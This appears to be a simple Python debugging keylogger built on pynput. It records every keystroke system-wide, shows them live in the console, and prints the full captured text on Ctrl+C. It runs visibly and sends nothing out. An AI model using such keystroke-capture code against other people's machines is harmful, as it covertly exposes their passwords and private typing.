# debug_keylogger_ctrl_c.py
#!/usr/bin/env python3
import datetime
import signal
import sys
from pynput.keyboard import Key, Listener

buffer = []
keystroke_count = 0
running = True

def signal_handler(sig, frame):
    global running
    print("\n\n[!] Ctrl+C pressed - Stopping...")
    running = False
    # Print captured text
    print("\n" + "="*60)
    print("CAPTURED TEXT:")
    print("="*60)
    print(''.join(buffer))
    print("="*60)
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def key_to_str(key):
    from pynput.keyboard import Key
    special = {
        Key.space: " ", 
        Key.enter: "\n",
        Key.tab: "[TAB]", 
        Key.backspace: "[BKSP]",
    }
    if key in special:
        return special[key]
    try:
        return key.char or ""
    except AttributeError:
        return ""

def on_press(key):
    global keystroke_count
    if not running:
        return False
    
    text = key_to_str(key)
    if text:
        buffer.append(text)
        keystroke_count += 1
        # Show last 50 characters
        display = ''.join(buffer)[-50:]
        print(f"\r[{keystroke_count}] {display}", end="", flush=True)

print("="*60)
print("KEYLOGGER - Press Ctrl+C to stop")
print("="*60)
print()

listener = Listener(on_press=on_press)
listener.start()

try:
    while running:
        pass
except KeyboardInterrupt:
    pass

listener.stop()